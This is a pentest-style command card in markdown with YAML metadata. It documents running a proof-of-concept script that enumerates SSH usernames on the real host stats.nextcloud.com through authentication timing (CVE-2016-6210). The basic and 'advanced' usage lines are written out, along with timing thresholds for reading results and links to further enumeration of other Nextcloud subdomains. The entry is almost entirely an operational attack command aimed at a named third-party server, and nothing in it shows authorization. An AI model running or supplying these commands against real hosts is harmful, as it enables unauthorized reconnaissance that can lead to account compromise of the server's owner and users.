---
id: cmd-002
data: python POC.py stats.nextcloud.com -U usernames.txt
tags:
  - enumeration
  - ssh
type: command
output: >-
  Output showing usernames with response times; identifies non-existing users
  based on low times
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.921Z'
verified: false
validated: true
submitted: true
---
# python-poc-py-username-enumeration-stats-nextcloud-com

## Command

```bash
python POC.py stats.nextcloud.com -U usernames.txt
```

## Description

Executes the POC script to enumerate usernames on stats.nextcloud.com by timing SSH authentication attempts, leveraging CVE-2016-6210 for information disclosure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| hostname | Target SSH server (e.g., stats.nextcloud.com) | Yes |
| -U | Path to usernames.txt file | Yes |

## Examples

### Basic Usage

```bash
python POC.py stats.nextcloud.com -U usernames.txt
```

### Advanced Usage

```bash
python POC.py stats.nextcloud.com -U usernames.txt | tee stats_results.txt
```

## Expected Output

List of usernames with timings; low response times (<0.047s) flag non-existent users.

## Related

- [[commands/python-poc-py-username-enumeration-newsletter-nextcloud-com]]
- [[procedures/Extend-Enumeration-to-Additional-Nextcloud-Subdomains]]
